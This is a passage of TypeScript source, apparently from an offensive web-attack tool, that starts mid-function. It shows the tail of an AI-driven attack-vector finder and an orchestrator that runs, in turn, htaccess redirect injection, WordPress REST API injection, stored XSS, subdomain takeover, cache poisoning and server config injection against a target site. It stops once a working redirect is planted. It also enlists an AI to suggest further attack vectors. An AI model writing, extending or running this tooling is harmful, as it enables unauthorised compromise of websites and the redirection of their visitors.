      const parsed = JSON.parse(typeof content === "string" ? content : JSON.stringify(content));
      const highLikelihood = parsed.vectors?.filter((v: any) => v.likelihood === "high") || [];
      
      if (highLikelihood.length > 0) {
        return {
          method,
          success: true,
          detail: `🧠 AI พบ ${parsed.vectors.length} attack vectors (${highLikelihood.length} high likelihood)`,
          evidence: JSON.stringify(parsed.vectors.slice(0, 3)),
          redirectWorks: false, // AI analysis only — no actual redirect placed
        };
      }

      return {
        method,
        success: parsed.vectors?.length > 0,
        detail: `🧠 AI แนะนำ ${parsed.vectors?.length || 0} attack vectors`,
        evidence: JSON.stringify(parsed.vectors?.slice(0, 3)),
      };
    }
  } catch (err: any) {
    return { method, success: false, detail: `❌ AI analysis failed: ${err.message}` };
  }

  return { method, success: false, detail: "❌ AI could not find additional attack vectors" };
}

// ═══════════════════════════════════════════════════════
//  MAIN: Run All Shellless Attacks
// ═══════════════════════════════════════════════════════

export async function runShelllessAttacks(config: ShelllessConfig): Promise<ShelllessResult[]> {
  const results: ShelllessResult[] = [];
  
  const methods = [
    htaccessRedirectInjection,
    wpRestApiInjection,
    openRedirectAbuse,
    storedXssInjection,
    subdomainTakeover,
    cachePoisoning,
    rssSitemapInjection,
    metaCanonicalInjection,
    serverConfigInjection,
    aiCreativeAttack,
  ];

  for (const method of methods) {
    try {
      const result = await Promise.race([
        method(config),
        new Promise<ShelllessResult>((_, reject) => 
          setTimeout(() => reject(new Error("Method timeout")), config.timeout || 30000)
        ),
      ]);
      results.push(result);
      
      // If we got a working redirect, we can stop early
      if (result.success && result.redirectWorks) {
        config.onProgress?.("early_exit", `🎯 Found working redirect via ${result.method} — stopping early`);
        break;
      }
    } catch (err: any) {
      results.push({
        method: method.name,
        success: false,
        detail: `❌ ${method.name} timeout/error: ${err.message}`,
      });
    }
  }

  return results;
}
